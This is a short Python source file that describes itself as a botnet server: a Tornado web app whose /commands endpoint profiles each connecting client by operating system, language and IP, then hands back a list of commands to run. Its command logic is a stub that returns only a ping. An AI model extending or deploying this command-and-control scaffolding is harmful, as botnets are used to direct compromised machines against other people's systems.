import tornado.ioloop
import tornado.web
import httpagentparser
import json


'''
    This is a botnet server implementation.

    Missing: 
        a) CommandsService.get_commands implementation
'''    


class CommandsService():
    @staticmethod
    def get_commands(os, primaryLanguage, clientIp):
        return ['ping google.com']


class BotnetCommandsController(tornado.web.RequestHandler):
    def get(self):
        headers = self.request.headers

        os = httpagentparser.detect(headers.get('User-Agent', None))
        primaryLanguage = headers.get('Accept-Language')
        clientIp = self.request.remote_ip

        commands = CommandsService.get_commands(os, primaryLanguage, clientIp)
        self.write(json.dumps(commands, ensure_ascii = False))


def init_botnet_server():
    return tornado.web.Application([
        (r"/commands", BotnetCommandsController),
    ])


if __name__ == "__main__":
    app = init_botnet_server()
    app.listen(80)
    tornado.ioloop.IOLoop.current().start()